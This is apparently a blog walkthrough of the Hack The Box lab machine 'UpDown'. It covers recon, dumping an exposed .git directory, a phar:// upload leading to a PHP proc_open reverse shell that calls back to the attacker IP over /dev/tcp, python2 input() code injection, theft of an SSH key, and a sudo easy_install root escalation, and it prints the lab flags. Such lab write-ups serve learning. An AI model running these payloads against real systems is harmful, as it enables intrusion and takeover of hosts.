+++
title = "HTB - UpDown"
date = 2025-03-04
+++

---
title: "UpDown - Hack the Box"
date: 2025-2-11 13:28:20 -0400
categories: [Hack the Box]
tags: [Walkthrough, Linux, RCE, PHP, GIT, Medium]
image: /assets/UpDown.png
---
<img alt="Image" async src="images/UpDown.png" width="800px"></img>

Updown is a medium-difficulty box that starts with finding and reverse-engineering a hidden `.git` directory for a website uptime checker. We find a special header for a developer version of the site that allows files to be uploaded, and we gain access to the machine via the PHP `proc_open` function - allowing arbitrary code execution which we leverage into a reverse shell. From there, we find a legacy python script, take advantage dangerous `eval()` function implementation, and then abuse RSA key pairs to SSH into the box as the developer. Lastly, we see an `easy install` binary and exploit it via GTFO Bins. Let's get cracking.
### Scan

```
nmap -sV -sC -p- --open 10.10.11.177
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-11 13:28 EST
Nmap scan report for 10.10.11.177
Host is up (0.13s latency).
Not shown: 65428 closed tcp ports (reset), 105 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.57 seconds
```

### Enumeration

Noting the scan, we can start to pick up patterns. Usually, the SSH is always a late stage pivot from information gained through web enumeration. This is no different. The web instance looks to be a site up/down detector. 

<img alt="Image" async src="images/Screenshot 2025-02-26 at 16.46.59.png" width="800px"></img>

We can throw our IP address here to get a hit and potentially gain some information if the site isn't configured properly.

<img alt="Image" async src="images/Screenshot 2025-02-26 at 16.48.46.png" width="800px"></img>

We can verify the connection, but nothing other than the domain name is leaked. We can update our `/etc/hosts` with `siteisup.htb`

Running a `feroxbuster` and `ffuf` scan: 

`ffuf -c -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fc 301 -fs 1131`

`feroxbuster -u http://siteisup.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php`

<img alt="Image" async src="images/Screenshot 2025-02-26 at 19.19.48.png" width="800px"></img>
<img alt="Image" async src="images/Screenshot 2025-02-26 at 19.22.14.png" width="800px"></img>

We find a `dev` directory/subdomain and a `.git` instance. These both being odd sitings on an open server, these are probably our point of entry. It's important to make sure your wordlist reflects what it is you're looking for. I'd missed the `.git` directory many times using the 2.3 medium lists. Raft-small-words looks to cover the other's blind spots quite nicely. Update `/etc/hosts` with the `dev` subdomain as well.

`gitdumper`is a tool we can use to comb through things like this. Installing with `pip` is an option, just be sure to use a virtual environment or, if not, be wary of breaking system packages on install. (`pip install git-dumper --break-system-packages`)

Once downloading, we get the source code for the `siteisup` website. 6 paths. We can note a few things here by looking at the files. Catting out all of the main files on the page:


###### `.htaccess`: 
<img alt="Image" async src="images/Screenshot 2025-02-26 at 19.00.34.png" width="800px"></img>
Talks about filtering for an `only4dev` header to allow access to a special environment

##### `admin.php`: 
<img alt="Image" async src="images/Screenshot 2025-02-26 at 19.00.13.png" width="800px"></img>
I believe this script denies access to the development version of the tool
##### `checker.php`: 
Is the tool itself
```php
<?php
if(DIRECTACCESS){
        die("Access Denied");
}
?>
<!DOCTYPE html>
<html>

  <head>
    <meta charset='utf-8' />
    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
    <link rel="stylesheet" type="text/css" media="screen" href="stylesheet.css">
    <title>Is my Website up ? (beta version)</title>
  </head>

  <body>

    <div id="header_wrap" class="outer">
        <header class="inner">
          <h1 id="project_title">Welcome,<br> Is My Website UP ?</h1>
          <h2 id="project_tagline">In this version you are able to scan a list of websites !</h2>
        </header>
    </div>

    <div id="main_content_wrap" class="outer">
      <section id="main_content" class="inner">
        <form method="post" enctype="multipart/form-data">
                            <label>List of websites to check:</label><br><br>
                                <input type="file" name="file" size="50">
                                <input name="check" type="submit" value="Check">
                </form>

<?php

function isitup($url){
        $ch=curl_init();
        curl_setopt($ch, CURLOPT_URL, trim($url));
        curl_setopt($ch, CURLOPT_USERAGENT, "siteisup.htb beta");
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $f = curl_exec($ch);
        $header = curl_getinfo($ch);
        if($f AND $header['http_code'] == 200){
                return array(true,$f);
        }else{
                return false;
        }
    curl_close($ch);
}

if($_POST['check']){
  
        # File size must be less than 10kb.
        if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
        $file = $_FILES['file']['name'];

        # Check if extension is allowed.
        $ext = getExtension($file);
        if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
                die("Extension not allowed!");
        }
  
        # Create directory to upload our file.
        $dir = "uploads/".md5(time())."/";
        if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
  
  # Upload the file.
        $final_path = $dir.$file;
        move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");

  # Read the uploaded file.
        $websites = explode("\n",file_get_contents($final_path));

        foreach($websites as $site){
                $site=trim($site);
                if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
                        $check=isitup($site);
                        if($check){
                                echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
                        }else{
                                echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
                        }
                }else{
                        echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
                }
        }

  # Delete the uploaded file.
        @unlink($final_path);
}

function getExtension($file) {
        $extension = strrpos($file,".");
        return ($extension===false) ? "" : substr($file,$extension+1);
}
?>
      </section>
    </div>

    <div id="footer_wrap" class="outer">
      <footer class="inner">
        <p class="copyright">siteisup.htb (beta)</p><br>
        <a class="changelog" href="changelog.txt">changelog.txt</a><br>
      </footer>
    </div>

  </body>
</html>
```
##### `index.php`: 
<img alt="Image" async src="images/Screenshot 2025-02-26 at 18.58.50.png" width="800px"></img>
This script dynamically includes files based on user input from the page parameter, allowing users to load different pages like admin.php by appending ?page=admin to the URL. However, it is highly vulnerable to **Local File Inclusion (LFI)** attacks because it directly passes user input to the include() function without proper sanitization. While it attempts to block certain system directories using a regular expression filter (bin|usr|home|var|etc), this is **not sufficient** to prevent attackers from bypassing restrictions using encoding tricks, directory traversal (../), or null byte injection. As a result, an attacker could manipulate the input to include and execute arbitrary files on the server, potentially exposing sensitive files like `/etc/passwd` or executing malicious scripts if they have upload access.


##### `changelog.txt`: 
<img alt="Image" async src="images/Screenshot 2025-02-26 at 18.59.16.png" width="800px"></img>
A few notes from the developer giving us a bit of information.

##### Path Forward
So, covering our bases, we know the header value necessary for accessing the developer version of the tool that will let us upload files and include `.php` into the file name for execution. We can start by modifying our header.

There's an extension called `modifyheadervalue` where we can change the value and try to access.

<img alt="Image" async src="images/Screenshot 2025-02-26 at 19.13.32.png" width="800px"></img>

Using that, now we've got access to the version of the site that allows us to upload files once we visit `dev.siteisup.htb`. This version can scan websites and upload files as well.

<img alt="Image" async src="images/Screenshot 2025-02-26 at 19.24.56.png" width="800px"></img>

The uploads directory has listings on, and though we cannot pass regular php or zip files, we can rename a zip archive and the file will upload. 0xdf referenced using `phar://` to get execution on a file - making an info.php and zipping into a info.li0t or something arbitrary to get the extension added afterwards by the `index.php` script.

When PHP accesses a PHAR file using phar://, it automatically deserializes any serialized objects stored in the PHAR’s metadata, even if the actual file being accessed is not related to PHP execution. If an application allows user-controlled file paths, an attacker can exploit this behavior to execute arbitrary PHP code.

We can create an arbitrary `info.php` file and zip it into `info.li0t`. Just echo `<?php phpinfo(); ?>` into the former and zip into the latter. Upload it. Then, head to the `/dev/uploads` folder to see the unique folder name. Navigate to the file:

`http://dev.siteisup.htb/?page=phar://uploads/d5d3ca2fd1460acc640751d7cf30a6f0/info.li0t/info`

We'll get a ton of information meaning that our execution worked. We can also see a list of functions that we aren't allowed to run in the `disable_functions` part of the info page. A lot is off limits, but `proc_open` seems to be available. [This](https://github.com/teambi0s/dfunc-bypasser) tool can be used to see which malicious functions aren't blocked. Just make sure to adjust the header in the script to match our `only4dev` and note it runs on `python2`.

`proc_open` is similar to [popen()](https://www.php.net/manual/en/function.popen.php) but provides a much greater degree of control over the program execution. Upon research, we can find a shell that takes advantage of this:

https://gist.github.com/noobpk/33e4318c7533f32d6a7ce096bc0457b7#file-reverse-shell-php-L62

We can set up to look like below. Make sure to have the three variables defined!

```php
<?php
// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);
$shell = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.14/443 0>&1'";
$process = proc_open($shell, $descriptorspec, $pipes);
```

Once done, we can save this as `test.php`, zip into `rev.li0t`. Then, we can upload this into the tool and visit our file in the uploads directory to get a call back on the shell. Make sure to start the listener prior with `rlwrap nc -nvlp 443`:

`http://dev.siteisup.htb/?page=phar://uploads/dadd4c80137c97f9c4f3f0355f310d36/rev.li0t/test`

<img alt="Image" async src="images/Screenshot 2025-02-26 at 20.09.45.png" width="800px"></img>

### Privilege Escalation

Stabilize the shell by checking `which` python version is present, then run:

`TARGET: python3 -c 'import pty; pty.spawn("/bin/bash")'`
`TARGET: BACKGROUND THE PROCESS WITH ^Z`
`HOST: stty raw -echo;fg`
`TARGET: export TERM="xterm"`

Looking around, in the` /home/developer/dev` directory, there's a site is up test script.

<img alt="Image" async src="images/Screenshot 2025-02-26 at 20.21.03.png" width="800px"></img>

I learned here that the space after the `print` defining the statement means it's written in python2, and python2 is vulnerable to code execution in the `input` function, which the script uses.

```python
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"
```

The input() function is insecure because it directly evaluates user input as code using the eval() function. This makes it vulnerable to code injection and remote code execution (RCE) if an attacker provides malicious input. When the script binary is executed, it will run as developer, and we can upgrade our shell when it's called with:

`__import__('os').system('bash')`

<img alt="Image" async src="images/Screenshot 2025-02-26 at 20.29.39.png" width="800px"></img>

We still aren't able to read the flag, but we CAN abuse an RSA key pair. Go to `.ssh` directory, `cat`out the `id_rsa`, copy it back to our machine with `python`, change the permission to 600,  and `ssh -i id_rsa developer@10.10.11.177`

USER:`ec3336c7e90533c0b380a0a0346e73e8`

Running `sudo -l` reveals an `easy install` binary. 

The easy_install binary is a legacy Python package manager that was originally part of Setuptools. It was used to install Python packages before pip became the standard package manager. The easy_install command allowed users to download and install Python packages directly from PyPI (Python Package Index or other package repositories.

Reference GTFO Bins for how to abuse privileges:

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF
```

ROOT:`f73255efc126322d6254176f144486e1`